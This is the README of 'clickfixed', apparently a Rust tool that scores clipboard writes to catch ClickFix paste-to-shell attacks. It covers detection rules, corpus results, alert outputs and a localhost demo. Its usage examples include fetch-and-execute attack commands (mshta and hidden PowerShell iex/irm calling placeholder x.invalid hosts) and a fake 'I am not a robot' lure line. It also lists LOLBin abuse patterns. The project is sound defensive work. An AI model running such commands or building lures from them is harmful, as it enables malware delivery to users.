# clickfixed

A ClickFix detection engine and Linux reference daemon, in Rust.

ClickFix ([MITRE T1204.004](https://attack.mitre.org/techniques/T1204/004/)) gets the user to paste an attacker's command into a shell. There's no exploit and no malicious download, so email filtering, browser sandboxing and download reputation never see it. EDR sees the **execution**. clickfixed watches the **moment before**: a browser writes to the clipboard, and the content is scored before it can be pasted.

> ⚠️ **`corpus/malicious.csv` contains real attack command structures.** Payload hosts are replaced with `.invalid` placeholders (RFC 2606, never resolves). Nothing in this repo executes corpus content. The engine decodes statically, in memory.

## Results

Fast path (Signal 1) on the bundled corpora. Reproduce with `cargo run --release -p cfx-eval -- run`. Full tables are in [`docs/RESULTS.md`](docs/RESULTS.md) and the method is in [`docs/EVALUATION.md`](docs/EVALUATION.md).

| config | detected (warn+) | blocked | false positives (warn+) | false blocks |
|---|---|---|---|---|
| **full** | **25/25 (100%)** | 15 | **1/400 (0.2%)** | 0 |
| no allowlist | 25/25 | 15 | 4/400 (1.0%) | 0 |
| no context (typed commands, Signal 2) | 20/25 (80%) | 7 | 0/400 | 0 |

**Fast-path latency:** p50 27 µs, p95 44 µs, p99 61 µs, max 1036 µs over 85,000 samples. None exceeded the 5 ms budget.

**Allowlist regression:** passes. No allowlist entry lowers any malicious row's verdict, either in its recorded context or in an attacker-best-case context (terminal target, engineer victim).

Caveats, stated plainly:
- The malicious corpus is 25 rows **reconstructed from public reporting** (`fidelity` column), not verbatim sandbox captures. These numbers measure the rules against that structure. They are not field detection rates.
- The one false positive is the nvm installer copied from its GitHub README. It's intentional: `github.com` hosts attacker content too, so it is never classified as vendor docs. It warns and does not block.
- **The deobfuscator isn't measured here.** The corpus has no encoded rows, so these numbers say nothing about encoded commands. The decoders have unit tests only.
- **The false-positive rate is likely optimistic.** A pasted AWS CLI transcript slipped past an earlier version of this corpus, so terminal output and config files were added, but 400 rows can't cover everyday clipboards. Expect some false positives and please report them.
- **Not tested against live services.** Jira, Slack and webhook outputs have only run against local mock servers, and the Wazuh decoder and rules have not been loaded into a real manager.

## How it works

```
Signal 1  PASTE-TIME   clipboard write → origin → features → shallow decode (≤2 layers, ≤5 ms) → warn/block
Signal 2  EXECUTION    exec event → match clipboard segment hashes → alert immediately (not gated on analysis)
Signal 3  POST-HOC     deep decode (≤5 layers, ≤500 ms) → IOC report (URLs, domains, IPs, paths, registry keys)
```

The three signals run on separate threads. None waits on another, and Signal 3 is fed by a bounded queue that Signal 1 only ever `try_send`s into.

**Scoring is deterministic.** Each feature is a named rule with a fixed weight ([`rules/default.toml`](crates/cfx-engine/src/rules/default.toml)):
- **Structural** (high precision): `mshta` with a remote URL, a media extension used as code, PE reconstruction, regsvr32/rundll32/msiexec/certutil abuse, trailing decoy prose ("I am not a robot – Verification ID: …").
- **Behavioral** (medium, need combination or context): fetch-and-execute, decode-and-execute, hidden window, encoding markers, staging-path writes, persistence, LOLBin chains.
- **Context multipliers:** Run dialog ×1.6, Win+X ×1.6, browser origin not explicitly classified ×1.3.
- **Never weighted:** command length, `&&` count, or entropy on its own. Entropy counts only when an interpreter token is present.

Score = Σ feature weights (max per feature across decode layers) − allowlist dampening, × context multipliers. **Warn ≥ 1.0, Block ≥ 2.0.** Admins get a slightly stricter threshold. Roles tune thresholds and never whitelist.

**The allowlist dampens; it never suppresses.** Every entry must name a fact the attacker doesn't control: an explicitly classified origin, the source app, or a structural shape (JWT, PEM, `| base64 -d` with nothing after it). The loader rejects entries without one, and there is no field for a literal command string. Each entry reduces only the features it names, so a Chocolatey bootstrap from `chocolatey.org` loses its fetch-and-execute weight but would still score on a Run key write. Every dampen is logged with its entry id. See [`rules/allowlist.toml`](crates/cfx-engine/src/rules/allowlist.toml).

## Layout

```
crates/cfx-engine   pure detection; no OS APIs (CI builds it for wasm32 to enforce this)
crates/cfx-collect  Collector trait; Linux: X11 clipboard (XFixes + XRes PID), auditd or /proc exec
crates/cfx-daemon   `clickfixed` binary: wires the three signals, notifications, block mode
crates/cfx-eval     corpus in, metrics out; allowlist regression test
crates/cfx-alert    ECS alert schema, severity mapping, outputs (stdout, file, syslog/CEF, webhook, Jira)
templates/          webhook/Jira payload templates (slack.json, jira.json, generic.json)
wazuh/              ossec.conf localfile block, decoder, generated ruleset, deployment README
corpus/             malicious.csv, benign.csv, benign_fp_generators.csv (source FP table)
demo/               safe local simulated lure (copies a command that runs a localhost echo script)
docs/               THREAT_MODEL.md, EVALUATION.md, RESULTS.md (generated), sample-alert.json(l)
```

## Usage

```sh
cargo build --release

# Score one command
./target/release/clickfixed check 'mshta https://x.invalid/v.mp4 # I am not a robot'
./target/release/clickfixed check 'curl -fsSL https://sh.rustup.rs | sh' --url https://rustup.rs/ --config clickfixed.example.toml

# Explain a verdict in full (features, dampens, multipliers, decode layers); --deep adds IOCs
./target/release/cfx-eval explain 'powershell -w h -c "iex(irm https://x.invalid/a)"' --target run_dialog --origin browser_unknown --deep

# Run the daemon (X11 / XWayland session)
./target/release/clickfixed run --config clickfixed.example.toml            # warn mode, /proc exec source
sudo scripts/audit-rules.sh && sudo ./target/release/clickfixed run --exec audit   # auditd exec source
./target/release/clickfixed run --mode block    # also replace the clipboard on Block verdicts

# Evaluate against corpora (yours too)
cargo run --release -p cfx-eval -- run --malicious corpus/malicious.csv --benign corpus/benign.csv --markdown docs/RESULTS.md
python3 scripts/import_history.py && cargo run --release -p cfx-eval -- run --benign corpus/benign_local.csv
```

Logs carry a hash prefix, the verdict, feature ids and the source app, never clipboard content. Reports for warn+ verdicts go to `~/.local/state/clickfixed/reports/<sha>.json` (mode 0600). A systemd user unit is in `packaging/`.

## Alerting and outputs

Every output renders the same alert from one ECS-compatible schema. Elastic and Splunk ingest it without a custom parser, and engine-specific fields live under `clickfixed.*`. **See [`docs/sample-alert.json`](docs/sample-alert.json)** for the full schema (a clipboard event and the execution that followed it). Each alert carries:

- the continuous score and the verdict (`benign` / `suspicious` / `malicious`)
- every matched feature with its weight
- the allowlist entries that dampened it, by id
- the command's SHA-256, plus the decoded command when the deobfuscator resolved one
- the origin URL and domain class, and the target application
- host, user and timestamp
- the ATT&CK technique (T1204.004) and analytic (AN0963 on Linux)
- a stable `clickfixed.dedupe_key`: sha256(host + command hash)

**Privacy is enforced in the schema, not in the outputs.** The alert builder never receives the raw text, only the verdict's hash and the decoder's layers. Feature evidence snippets are dropped, password-manager sources are refused, and origin URLs lose their userinfo, query and fragment. Tests check that no 12-byte window of the raw command appears in any alert or rendered template.

**One severity mapping.** The engine decides the verdict. `[[alerts.severity]]` in `config.toml` maps verdict + score to one band, and each band defines the Wazuh level, syslog severity, CEF severity, ECS `event.severity`, Slack colour and Jira priority. Outputs read the band stamped on the alert. None of them sets its own thresholds.

| band (default) | verdict | Wazuh | syslog | CEF | Slack | Jira |
|---|---|---|---|---|---|---|
| medium | suspicious | 7 | 4 warning | 5 | amber | Medium |
| high | malicious | 12 | 2 critical | 8 | red | High |
| critical | malicious, score ≥ 3.0 | 14 | 1 alert | 10 | dark red | Highest |

### Outputs

Enable outputs in `config.toml` (annotated in [`clickfixed.example.toml`](clickfixed.example.toml)). Each one has a `min_severity` (a band name).

| output | config | what | env vars |
|---|---|---|---|
| stdout | `[outputs.stdout] enabled = true` | ECS JSON lines on stdout (logs go to stderr) | none |
| file | `[outputs.file] enabled = true`, `path` | Same JSON lines appended to a 0600 file; reopened on rotation. Wazuh, Filebeat or the Splunk UF tail it | none |
| syslog | `[outputs.syslog]`: `transport` unix/udp/tcp, `address`, `facility`, `format` | CEF (`CEF:0\|clickfixed\|…`): score, features, dampens, hashes and dedupe key in `cfp1`/`cs1`–`cs6`, decoded command in `msg` | none |
| webhook | `[[outputs.webhook]]`: `name`, `url`, `template`, `headers`, `timeout_secs`, `retries` | HTTP POST of a **template file** ([`templates/slack.json`](templates/slack.json), [`templates/generic.json`](templates/generic.json)). Adding Teams or PagerDuty means adding a template, not rebuilding | whatever `url`/`headers` reference, e.g. `CFX_SLACK_WEBHOOK_URL`, `CFX_GENERIC_WEBHOOK_TOKEN` |
| jira | `[outputs.jira]`: `base_url`, `project`, `issue_type`, `auth`, `user`, `token`, `template`, `on_duplicate` | One issue per host + command (see below). Field mapping = [`templates/jira.json`](templates/jira.json) | `CFX_JIRA_USER`, `CFX_JIRA_API_TOKEN` |
| Wazuh | file output + [`wazuh/`](wazuh/) | No API calls: `localfile` block, decoder, and rules generated from the mapping. See [`wazuh/README.md`](wazuh/README.md) | none |

**Templates** are JSON with `{{field.path}}` placeholders that resolve against the alert, plus `fmt.*` helpers and `jira.*` for Jira. A string that is exactly one placeholder keeps the value's type (`"{{clickfixed.score}}"` renders a number, `"{{alert}}"` the whole alert). Substitution happens on parsed JSON, so decoded attacker text can't break out of a string. The `|slack` and `|jira` filters escape each platform's markup. Every placeholder is checked at startup, so a typo stops the daemon instead of sending blank fields.

**Jira deduplicates.** The dedupe key is stored on the issue as a label (`clickfixed-<32 hex>`). Before creating an issue, clickfixed searches for an open issue (status category not Done) with that label. If one exists, it adds a comment. If the new alert maps to a higher band, it also raises the priority, and it never lowers one. A re-copy, a later execution of the same pasted command, and the same command seen from a worse context all land on one ticket. Project, issue type, `search_path` (Cloud: `/rest/api/2/search/jql`; Data Center: `/rest/api/2/search`) and `on_duplicate` (`comment` / `skip`) are set in the config. Fields, including custom fields, are set in the template. Separately from Jira, `[alerts.dedupe] suppress_window_secs` drops an identical (dedupe key, action) pair before any output sees it, unless its severity is higher.

**Failure isolation.** Each output runs on its own thread with its own bounded queue. The detection threads only `try_send`. A webhook timeout or a Jira 500 affects that output alone (retries with backoff on transport errors, 429 and 5xx), and stdout, file and syslog keep flowing. Delivery errors are logged with the output name and dedupe-key prefix, never with URLs or response bodies.

### Secrets

Secrets live in **environment variables only**, never in `config.toml` and never in the repo. The config names each variable with `${VAR}`. At startup the loader resolves every reference for enabled outputs. If any are missing, the daemon exits with code 2 and lists every missing variable by name and the field that needs it. The loader also rejects a literal `token`, a literal credential header (`Authorization`, `*token*`, `*key*`, …) and a literal URL that embeds a credential (Slack/Teams hooks, `token=`, userinfo).

| variable | needed when |
|---|---|
| `CFX_SLACK_WEBHOOK_URL` | the `slack` webhook is enabled (the Slack URL is the credential) |
| `CFX_GENERIC_WEBHOOK_TOKEN` | the `generic` webhook is enabled (sent as `Authorization: Bearer …`) |
| `CFX_JIRA_USER` | Jira is enabled with `auth = "basic"` (Cloud account email) |
| `CFX_JIRA_API_TOKEN` | Jira is enabled (Cloud API token, or Data Center PAT with `auth = "bearer"`) |

You can rename them freely; the config is the source of truth. [`.env.example`](.env.example) lists them with placeholder values. For local development, `--dotenv .env` loads a file (git-ignored, dev only, and real environment variables win). In production, use real environment variables, e.g. `EnvironmentFile=` in the systemd unit.

```sh
clickfixed alerts check --config config.toml          # validate env vars, templates, mapping; sends nothing
clickfixed alerts test  --config config.toml          # send one marked test alert to every enabled output
clickfixed alerts wazuh-rules --config config.toml    # Wazuh rules for this mapping
UPDATE_SAMPLES=1 cargo test -p cfx-alert              # regenerate docs/sample-alert.json(l) + wazuh rules
```

### Demo

```sh
demo/serve.sh                      # serves on 127.0.0.1:8765 only
./target/release/clickfixed run    # in another terminal
# open http://127.0.0.1:8765/lure.html and click "I'm not a robot"
```

The page writes `bash -c "$(curl -fsSL http://127.0.0.1:8765/verify.sh)" # I am not a robot …` to the clipboard, which scores **Warn** (Block when the browser origin comes through as an unknown domain). If you run it anyway, `verify.sh` only prints a message.

## Platform scope

**Built and tested on Linux; the engine itself is OS-independent.** The real-world ClickFix victims are on Windows and macOS. This Linux build demonstrates the engine against live events, and it does **not** protect the users who are actually being attacked. Windows (clipboard listener, ETW via `ferrisetw`, RunMRU) and macOS (pasteboard polling, `eslogger`) are designed for v1.5 and not built. See [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md).

On Wayland, clipboard access goes through XWayland. Copies from native Wayland apps reach X11 through the compositor's clipboard bridge, which shows up as the source app (e.g. `gnome-shell`), so browser origin is lost for those. Content is still scored.
